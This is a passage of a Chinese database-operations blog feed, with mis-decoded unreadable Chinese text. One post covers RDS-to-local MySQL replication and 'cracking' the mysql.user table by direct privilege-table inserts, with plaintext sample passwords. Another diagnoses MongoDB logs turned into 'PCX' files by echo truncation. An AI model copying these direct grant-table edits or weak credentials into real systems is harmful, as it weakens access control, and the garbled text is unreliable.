NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:97478646-97483368</span><br><span class="line">            Executed_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:1-97483368,</span><br><span class="line">c39ecf19-5daa-11e8-aa9c-7cd30ac4764a:1-178658794,</span><br><span class="line">c69289d7-9bc9-11e8-b922-44a842431b62:1-12</span><br><span class="line">                Auto_Position: 1</span><br><span class="line">         Replicate_Rewrite_DB: </span><br><span class="line">                 Channel_Name: </span><br><span class="line">           Master_TLS_Version: </span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> éªŒè¯åªè¯»è´¦å·</span></span><br><span class="line">mysql -uroot-p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -ujoowingbuz -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -uottersync -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -usyncdw -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -udatasis -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -ujoowingv -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -udatadev -p'123' -e "create database dbzyadmin;"</span><br><span class="line">mysql -ureadonly -p'123'  -e "create database dbzyadmin;"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> åªè¯»è´¦å·æ— æ³•æ‰§è¡Œå†™æ“ä½œï¼ŒéªŒè¯æˆåŠŸ</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">ERROR 1044 (42000) at line 1: Access denied for user 'readonly'@'%' to database 'dbzyadmin'</span><br></pre></td></tr></table></figure><h4 id="åç»­ç”¨æˆ·æƒé™å˜æ›´æ“ä½œæŒ‡å—"><a href="#åç»­ç”¨æˆ·æƒé™å˜æ›´æ“ä½œæŒ‡å—" class="headerlink" title="åç»­ç”¨æˆ·æƒé™å˜æ›´æ“ä½œæŒ‡å—"></a>åç»­ç”¨æˆ·æƒé™å˜æ›´æ“ä½œæŒ‡å—</h4><blockquote><p>åç»­æ–°å¢ç”¨æˆ·ã€åˆ é™¤ç”¨æˆ·ã€æ›´æ”¹å¯†ç å‘½ä»¤å¦‚ä¸‹ï¼š</p></blockquote><h5 id="æ–°å¢è¯»å†™ç”¨æˆ·"><a href="#æ–°å¢è¯»å†™ç”¨æˆ·" class="headerlink" title="æ–°å¢è¯»å†™ç”¨æˆ·"></a>æ–°å¢è¯»å†™ç”¨æˆ·</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into mysql.user_1 values ('%','ã€ç”¨æˆ·åã€‘', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('ã€å¯†ç ã€‘'));</span><br></pre></td></tr></table></figure><h5 id="æ–°å¢åªè¯»ç”¨æˆ·"><a href="#æ–°å¢åªè¯»ç”¨æˆ·" class="headerlink" title="æ–°å¢åªè¯»ç”¨æˆ·"></a>æ–°å¢åªè¯»ç”¨æˆ·</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into mysql.user_1 values ('%','ã€ç”¨æˆ·åã€‘', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('ã€å¯†ç ã€‘'));</span><br></pre></td></tr></table></figure><h5 id="åˆ é™¤ç”¨æˆ·å‘½ä»¤"><a href="#åˆ é™¤ç”¨æˆ·å‘½ä»¤" class="headerlink" title="åˆ é™¤ç”¨æˆ·å‘½ä»¤"></a>åˆ é™¤ç”¨æˆ·å‘½ä»¤</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from mysql.user where user='ã€ç”¨æˆ·åã€‘';</span><br></pre></td></tr></table></figure><h5 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string=password('ã€å¯†ç ã€‘') where user='ã€ç”¨æˆ·åã€‘';</span><br></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>RDSç›®å‰ä½¿ç”¨MySQLç‰ˆæœ¬å’Œå®˜æ–¹åœ¨ç³»ç»Ÿåº“ä¸Šå·®å¼‚è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œè‹¥éœ€è¦æ­å»ºRDSåˆ°çº¿ä¸‹è‡ªå»ºMySQL5.7çš„ä¸»ä»æ—¶ï¼Œå¯ä»¥é€šè¿‡æ­¤æ³•å»å®ç°ã€‚</p><p>æœ¬æ–‡ä¸­å¯¹userè¡¨çš„ç ´è§£ï¼ŒåŒæ ·é€‚é€‚ç”¨äº<code>mysql.db</code> ã€<code>mysql.tables_priv</code>è¡¨ï¼Œéƒ½ç ´è§£åˆ™å¯ä»¥å°†æƒé™ä»ç”¨æˆ·æ‹“å±•åˆ°åº“è¡¨åˆ—ã€‚è¯»è€…å¯è‡ªè¡Œå®éªŒæµ‹è¯•ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦: é˜¿é‡Œäº‘çš„RDS For MySQL 5.7 åˆ°çº¿ä¸‹IDCæœºæˆ¿çš„ä¸»ä»æ­å»ºç›¸ä¿¡çœ‹å®˜æ–¹æ–‡æ¡£å°±å¯ä»¥å®Œæˆï¼Œä½†æ˜¯æ­å»ºä¹‹åå´å‘ç°æ— æ³•åœ¨æœ¬åœ°è¿›è¡Œè®¤è¯æƒé™çš„ç®¡ç†ï¼Œè¿™æ˜¯ä¸ºä½•ï¼Ÿè€Œé˜¿é‡Œå®˜æ–¹æ¨èä½¿ç”¨DTSåŒæ­¥å·¥å…·å»å®ç°ï¼Œè¿™ä¸ªè´¹ç”¨ç€å®ä¸å°‘ï¼Œåˆæ˜¯å¦èƒ½å¤Ÿç ´è§£å‘¢ï¼Ÿæœ¬æ–‡è¯¦è§£å¦‚ä½•æš´åŠ›ç ´è§£userè¡¨å®ç°ä»åº“ç”¨æˆ·æƒé™æ›´æ”¹åŠŸèƒ½&lt;/p&gt;
    
    </summary>
    
    
      <category term="æŠ€æœ¯å¹¿è§’" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MySQL" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"/>
    
    
      <category term="RDS" scheme="http://www.toberoot.com/tags/RDS/"/>
    
      <category term="ä¸»ä»åŒæ­¥" scheme="http://www.toberoot.com/tags/%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨splitå·¥å…·è§£å†³ä¸€æ¬¡MongoDBæ—¥å¿—å¼‚å¸¸é—®é¢˜</title>
    <link href="http://www.toberoot.com/2018/08/03/booboo_others/%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/"/>
    <id>http://www.toberoot.com/2018/08/03/booboo_others/%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/</id>
    <published>2018-08-03T12:25:24.000Z</published>
    <updated>2020-03-22T08:32:42.584Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼š </p><ul><li>æŸå¤©æ™šä¸Šåˆšåˆ°å®¶ä¸ä¹…ï¼Œå°±æ¥åˆ°æ­å·åŒäº‹çš„ç”µè¯ï¼Œå®¢æˆ·MongoDBé›†ç¾¤ä¸­çš„æŸä¸ªåˆ†ç‰‡èŠ‚ç‚¹CPUé£™é«˜ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯æ…¢æŸ¥è¯¢ï¼Œç°åœ¨éœ€è¦æ‹‰å–CPUé£™é«˜æ—¶é—´æ®µçš„æ…¢æŸ¥è¯¢ã€‚å¿ƒæƒ³æ‹‰å–æ…¢æŸ¥è¯¢åº”è¯¥å¾ˆå¿«ï¼Œä¸å°±æ˜¯ä¸ªç³»ç»Ÿæ—¥å¿—å—ï¼Ÿè€Œä¸”è¿˜åšäº†æ—¥å¿—åˆ‡å‰²ä¸€å¤©ä¸€ä¸ªï¼ŒæŒ‰é“ç†å¾ˆå¿«æå®šçš„ï¼Œè°çŸ¥å½“å¤©æ™šä¸Šæäº†æ¥è¿‘ä¸‰ä¸ªå°æ—¶ä¹Ÿæ²¡æå®šã€‚ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</li><li>è¿›å…¥åˆ°æ—¥å¿—ç›®å½•ä¸€çœ‹ï¼Œç›®å‰ä¿ç•™è¿‘7å¤©çš„æ—¥å¿—ï¼Œæ¯å¤©çš„æ—¥å¿—é‡åœ¨23G~24Gï¼Œæˆ‘å½“æ—¶å°±æƒ³è¿™ä¸ªå®¢æˆ·æ•°æ®é‡è¿™ä¹ˆå¤§ï¼åç»­å‘ç°æ—¥å¿—æ ¼å¼æœ¬è¯¥ä¸ºæ™®é€šæ–‡æœ¬æ–‡ä»¶ç¡®å˜æˆäº†å›¾ç‰‡æ ¼å¼ï¼Œç©¶ç«Ÿä¸ºä½•ä¼šæ–‡ä»¶æ ¼å¼ä¼šè½¬å˜ï¼Ÿèƒ½å¦ä»å›¾ç‰‡æ ¼å¼ä¸­æ‹‰å–æŒ‡å®šæ—¶é—´æ®µçš„æ—¥å¿—å‘¢ï¼Ÿ</li><li>ç¬¬äºŒå¤©åˆ°å…¬å¸ï¼Œç”±äºå®¢æˆ·ç¯å¢ƒæˆ‘ä»¬ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥æ‰‹ï¼Œå› æ­¤å’±ä»¬æŠ€æœ¯ä¸“å®¶å›¢é˜Ÿæäº†ä¸€ä¸ª3äººçš„â€ä¸“å®¶ä¼šè¯Šâ€ï¼Œç»è¿‡äº†ä¸€ç•ªæŠ˜è…¾æ€»ç®—æŠŠåŸå› æ‰¾åˆ°äº†ï¼Œå…·ä½“è¿‡ç¨‹è¯·çœ‹ä¸‹æ–‡ï¼</li></ul><a id="more"></a><h2 id="æ•…äº‹èƒŒæ™¯"><a href="#æ•…äº‹èƒŒæ™¯" class="headerlink" title="æ•…äº‹èƒŒæ™¯"></a>æ•…äº‹èƒŒæ™¯</h2><h3 id="æ•°æ®åº“æ˜ç»†"><a href="#æ•°æ®åº“æ˜ç»†" class="headerlink" title="æ•°æ®åº“æ˜ç»†"></a>æ•°æ®åº“æ˜ç»†</h3><p>è¯´åœ¨å‰é¢ï¼š</p><ul><li>æ•°æ®åº“ï¼šMongoDBé›†ç¾¤ 4ä¸ªåˆ†ç‰‡èŠ‚ç‚¹</li><li>åˆ†ç‰‡èŠ‚ç‚¹è§„æ ¼ï¼š16æ ¸ / 32G CentOS 7.4 64ä½</li><li>æ•°æ®ç›®å½•æ‰€åœ¨ç£ç›˜: 300G   49G  252G  17% /data</li></ul><h3 id="æ•…äº‹æƒ…èŠ‚"><a href="#æ•…äº‹æƒ…èŠ‚" class="headerlink" title="æ•…äº‹æƒ…èŠ‚"></a>æ•…äº‹æƒ…èŠ‚</h3><ul><li>æŸå¤©æ™šä¸Šåˆšåˆ°å®¶ä¸ä¹…ï¼Œå°±æ¥åˆ°æ­å·åŒäº‹çš„ç”µè¯ï¼Œå®¢æˆ·MongoDBé›†ç¾¤ä¸­çš„æŸä¸ªåˆ†ç‰‡èŠ‚ç‚¹CPUé£™é«˜ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯æ…¢æŸ¥è¯¢ï¼Œç°åœ¨éœ€è¦æ‹‰å–CPUé£™é«˜æ—¶é—´æ®µçš„æ…¢æŸ¥è¯¢ã€‚å¿ƒæƒ³æ‹‰å–æ…¢æŸ¥è¯¢åº”è¯¥å¾ˆå¿«ï¼Œä¸å°±æ˜¯ä¸ªç³»ç»Ÿæ—¥å¿—å—ï¼Ÿè€Œä¸”è¿˜åšäº†æ—¥å¿—åˆ‡å‰²ä¸€å¤©ä¸€ä¸ªï¼ŒæŒ‰é“ç†å¾ˆå¿«æå®šçš„ï¼Œè°çŸ¥å½“å¤©æ™šä¸Šæäº†æ¥è¿‘ä¸‰ä¸ªå°æ—¶ä¹Ÿæ²¡æå®šã€‚ç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</li><li>è¿›å…¥åˆ°æ—¥å¿—ç›®å½•ä¸€çœ‹ï¼Œç›®å‰ä¿ç•™è¿‘7å¤©çš„æ—¥å¿—ï¼Œæ¯å¤©çš„æ—¥å¿—é‡åœ¨23G~24Gï¼Œæˆ‘å½“æ—¶å°±æƒ³è¿™ä¸ªå®¢æˆ·æ•°æ®é‡è¿™ä¹ˆå¤§ï¼åç»­å‘ç°æ—¥å¿—æ ¼å¼æœ¬è¯¥ä¸ºæ™®é€šæ–‡æœ¬æ–‡ä»¶ç¡®å˜æˆäº†å›¾ç‰‡æ ¼å¼ï¼Œç©¶ç«Ÿä¸ºä½•ä¼šæ–‡ä»¶æ ¼å¼ä¼šè½¬å˜ï¼Ÿèƒ½å¦ä»å›¾ç‰‡æ ¼å¼ä¸­æ‹‰å–æŒ‡å®šæ—¶é—´æ®µçš„æ—¥å¿—å‘¢ï¼Ÿ</li><li>ç¬¬äºŒå¤©åˆ°å…¬å¸ï¼Œç”±äºå®¢æˆ·ç¯å¢ƒæˆ‘ä»¬ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥å—ï¼Œå› æ­¤å’±ä»¬æŠ€æœ¯ä¸“å®¶å›¢é˜Ÿæäº†ä¸€ä¸ª3äººçš„â€ä¸“å®¶ä¼šè¯Šâ€ï¼Œç»è¿‡äº†ä¸€ç•ªæŠ˜è…¾æ€»ç®—æŠŠåŸå› æ‰¾åˆ°äº†ï¼Œå…·ä½“è¿‡ç¨‹è¯·çœ‹ä¸‹æ–‡ï¼</li></ul><h2 id="å¤ç°ä¸å‰–æ"><a href="#å¤ç°ä¸å‰–æ" class="headerlink" title="å¤ç°ä¸å‰–æ"></a>å¤ç°ä¸å‰–æ</h2><h3 id="æ‹‰å–æ—¥å¿—å¼‚å¸¸"><a href="#æ‹‰å–æ—¥å¿—å¼‚å¸¸" class="headerlink" title="æ‹‰å–æ—¥å¿—å¼‚å¸¸"></a>æ‹‰å–æ—¥å¿—å¼‚å¸¸</h3><p><strong>ä½¿ç”¨mlogfilterè¿‡æ»¤æ–‡ä»¶æ—¶æŠ¥é”™è¯´æ–‡ä»¶émongodbçš„æ—¥å¿—æ–‡ä»¶</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 booboo]# mlogfilter shard.log.2018-08-01 --from 2018-08-01T15:00:00.000+0800 --to "+1h" --slow 1000 &gt; /alidata/booboo/tf.1</span><br><span class="line">æŠ¥é”™:émongodbæ—¥å¿—æ ¼å¼</span><br></pre></td></tr></table></figure><p>å›åˆ°å®¢æˆ·æœåŠ¡å™¨æ£€æŸ¥æ—¥å¿—æ–‡ä»¶æ ¼å¼ï¼Œæ˜ç»†å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@MONGO-SHARD-18 logs]# file *</span><br><span class="line">shard.log:            PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-25: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-26: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-27: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-28: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-29: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-30: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-07-31: PCX ver. 2.5 image data</span><br><span class="line">shard.log.2018-08-01: PCX ver. 2.5 image data</span><br></pre></td></tr></table></figure><p>mongodbçš„æ—¥å¿—æ­£å¸¸åº”è¯¥ä¸ºï¼š<code>ASCII text, with very long lines</code>ï¼Œä½†æ˜¯ç°åœ¨å´å˜æˆäº†<code>PCX ver. 2.5 image data</code>ã€‚éœ€è¦å¼„æ¸…æ¥šåŸå› ã€‚</p><h3 id="æ—¥å¿—å¼‚å¸¸åˆ†æ"><a href="#æ—¥å¿—å¼‚å¸¸åˆ†æ" class="headerlink" title="æ—¥å¿—å¼‚å¸¸åˆ†æ"></a>æ—¥å¿—å¼‚å¸¸åˆ†æ</h3><ul><li>ä¸ºä»€ä¹ˆå®¢æˆ·æ¯å¤©çš„æ—¥å¿—é‡è¾¾åˆ°22ä¸ªGï¼Œå¹¶ä¸”æ¯å¤©çš„æ—¥å¿—é‡éƒ½æ˜¯å¤§äºç­‰äºå‰ä¸€å¤©ï¼Ÿå¾ˆæ˜¾ç„¶ï¼Œæ—¥å¿—æˆªæ–­æœ‰é—®é¢˜ã€‚</li><li>è¿™ä¸ªæ˜¯è¿‘7å¤©çš„æ—¥å¿—ï¼Œè€Œæ—¥å¿—æ ¼å¼å˜æˆäº†PCXå›¾ç‰‡æ ¼å¼æ˜¯ä¸ºä½•ï¼Ÿ</li><li>æ€€ç–‘æ¯æ¬¡æ—¥å¿—è½®è¯¢æ—¶éƒ½æ²¡æœ‰çœŸæ­£æˆªæ–­æ—¥å¿—ï¼</li></ul><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/01.png" alt=""></p><h3 id="åˆ†æåŸæ—¥å¿—åˆ‡å‰²æ˜ç»†"><a href="#åˆ†æåŸæ—¥å¿—åˆ‡å‰²æ˜ç»†" class="headerlink" title="åˆ†æåŸæ—¥å¿—åˆ‡å‰²æ˜ç»†"></a>åˆ†æåŸæ—¥å¿—åˆ‡å‰²æ˜ç»†</h3><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/03.png" alt=""></p><p>æ€€ç–‘ä¸<code>echo &gt;</code>æœ‰å…³ï¼Œè¿›è¡ŒéªŒè¯ã€‚</p><h3 id="éªŒè¯echo-gt-ä¸PCXå›¾ç‰‡å¤´éƒ¨0aä¸€è‡´"><a href="#éªŒè¯echo-gt-ä¸PCXå›¾ç‰‡å¤´éƒ¨0aä¸€è‡´" class="headerlink" title="éªŒè¯echo &gt;ä¸PCXå›¾ç‰‡å¤´éƒ¨0aä¸€è‡´"></a>éªŒè¯<code>echo &gt;</code>ä¸<code>PCXå›¾ç‰‡å¤´éƒ¨0aä¸€è‡´</code></h3><ol><li>å»ºä¸€ä¸ªç©ºæ–‡æ¡£<code>log</code>ï¼›æ‰§è¡Œ<code>echo &gt; log</code>ï¼›é€šè¿‡<code>cat -A log</code>æŸ¥çœ‹æ–‡ä»¶ä¸­æ’å…¥äº†ä¸€ä¸ªç¬¦å·å³æ¢è¡Œç¬¦<code>\n</code></li><li>é€šè¿‡<code>hexdump -c log</code> æŸ¥çœ‹æµ‹è¯•æ–‡ä»¶å¤´éƒ¨æ˜¾ç¤ºä¸ºASCIIå­—ç¬¦ <code>\n</code></li><li>é€šè¿‡<code>hexdump -d log</code> æŸ¥çœ‹æµ‹è¯•æ–‡ä»¶å¤´éƒ¨æ˜¾ç¤ºä¸º16è¿›åˆ¶<code>00010</code> å³<code>0a</code></li><li>é€šè¿‡<code>vim</code> ç”¨16è¿›åˆ¶æŸ¥çœ‹æ–‡æ¡£<code>log</code>å¯ä»¥çœ‹åˆ°logçš„æ–‡ä»¶å¤´éƒ¨ä¸º<code>0a</code>ï¼Œæ­£æ˜¯PCXå›¾ç‰‡çš„å¤´éƒ¨</li><li>ç”Ÿäº§ç¯å¢ƒæŸ¥çœ‹å®¢æˆ·æœ‰é—®é¢˜çš„mongodbç³»ç»Ÿæ—¥å¿—æ–‡ä»¶æ ¼å¼ä¸º<code>PCX</code>å›¾ç‰‡æ ¼å¼</li><li>é€šè¿‡<code>hexdump -c log</code> æ˜¾ç¤ºä¸ºASCIIå­—ç¬¦ï¼Œç”Ÿäº§æ—¥å¿—æ–‡ä»¶å¤´éƒ¨ä¸æµ‹è¯•çš„logä¸€è‡´ï¼Œéƒ½æ˜¯<code>\n</code></li><li>é€šè¿‡<code>hexdump -d log</code>æ˜¾ç¤ºä¸º16è¿›åˆ¶ï¼Œç”Ÿäº§æ—¥å¿—æ–‡ä»¶å¤´éƒ¨ä¸æµ‹è¯•çš„logä¸€è‡´<code>00010</code> å³ <code>0a</code></li></ol><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/02.png" alt=""></p><p><strong>åˆ°æ­¤éªŒè¯æˆåŠŸ:é€šè¿‡<code>echo &gt; log</code>çš„æ–¹å¼ä¼šå¾€æ–‡ä»¶å¤´éƒ¨æ–°å¢â€™0aâ€™</strong></p><hr><h3 id="å¤ç°MongoDBæ—¥å¿—ä»ASCII-textè½¬å˜ä¸ºPCX-æ ¼å¼"><a href="#å¤ç°MongoDBæ—¥å¿—ä»ASCII-textè½¬å˜ä¸ºPCX-æ ¼å¼" class="headerlink" title="å¤ç°MongoDBæ—¥å¿—ä»ASCII textè½¬å˜ä¸ºPCX æ ¼å¼"></a>å¤ç°MongoDBæ—¥å¿—ä»ASCII textè½¬å˜ä¸ºPCX æ ¼å¼</h3><p>åœ¨æµ‹è¯•ç¯å¢ƒä¸­å¤ç°æ—¥å¿—ä»<code>ASCII text</code>å˜æˆ<code>PCX ver. 2.5 image data</code></p><ol><li>é€šè¿‡mongoç™»é™†æ•°æ®åº“æ‰§è¡Œå¤§é‡çš„æ’å…¥æ“ä½œ</li><li>é€šè¿‡echo &gt; mongod27017.log  å‘½ä»¤å°è¯•æ¸…ç©ºmongod27017.log</li><li>æŸ¥çœ‹æˆªæ–­åçš„æ—¥å¿—æ–‡ä»¶æ ¼å¼ï¼Œå˜æˆäº†very short file (no magic)</li><li>ç­‰æ–‡æ¡£æ’å…¥å®Œæ¯•</li><li>é€šè¿‡<code>tail -f</code> æŸ¥çœ‹æ—¥å¿—æ˜ç»†ï¼Œçœ‹åˆ°ç¡®å®æœ‰æ—¥å¿—å†™å…¥</li><li>æŸ¥çœ‹æ—¥å¿—æ ¼å¼ï¼Œå‘ç°å˜æˆäº†<code>PCX ver. 2.5 image data</code></li></ol><p><img src="%E5%88%A9%E7%94%A8split%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%86%B3%E4%B8%80%E6%AC%A1MongoDB%E6%97%A5%E5%BF%97%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/05.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">[root@sh_01 ~]# mongo</span><br><span class="line">MongoDB shell version: 3.2.16</span><br><span class="line">connecting to: test</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> db.auth(<span class="string">'test_dev'</span>,<span class="string">'uplooking'</span>)</span></span><br><span class="line">1</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> db.t1.find()</span></span><br><span class="line">&#123; "_id" : ObjectId("5b5ebb6796b8b74a73ee30f6"), "a" : 1, "b" : 2 &#125;</span><br><span class="line">&#123; "_id" : ObjectId("5b5ebb6996b8b74a73ee30f7"), "a" : 1, "b" : 1 &#125;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="keyword">for</span> (i=1;i&lt;200000;i++)&#123;</span></span><br><span class="line">... db.t1.insert(&#123;id:i&#125;)&#125;</span><br><span class="line">WriteResult(&#123; "nInserted" : 1 &#125;)</span><br><span class="line"></span><br><span class="line">[root@sh_01 ~]# cd /alidata/mongodb/logs</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">-rw-r--r-- 1 root root 2182 Aug  3 10:28 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# echo &gt; mongod27017.log</span><br><span class="line">[root@sh_01 log]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 root root    1 Aug  3 10:29 mongod27017.log</span><br><span class="line">-rw-r--r-- 1 root root 3100 Aug  2 14:19 mongod27017.log.2018-08-02T07-18-27</span><br><span class="line">-rw-r--r-- 1 root root 1526 Aug  2 15:18 mongod27017.log.2018-08-02T07-18-54</span><br><span class="line">[root@sh_01 log]# file *</span><br><span class="line">mongod27017.log:                     very short file (no magic)</span><br><span class="line">mongod27017.log.2018-08-02T07-18-27: ASCII text, with very long lines</span><br><span class="line">mongod27017.log.2018-08-02T07-18-54: ASCII text, with very long lines</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# tail -f mongod27017.log</span><br><span class="line"></span><br><span class="line">2018-08-03T10:30:21.936+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:43720 #2 (2 connections now open)</span><br><span class="line"></span><br><span class="line">[root@sh_01 log]# ll -h</span><br><span 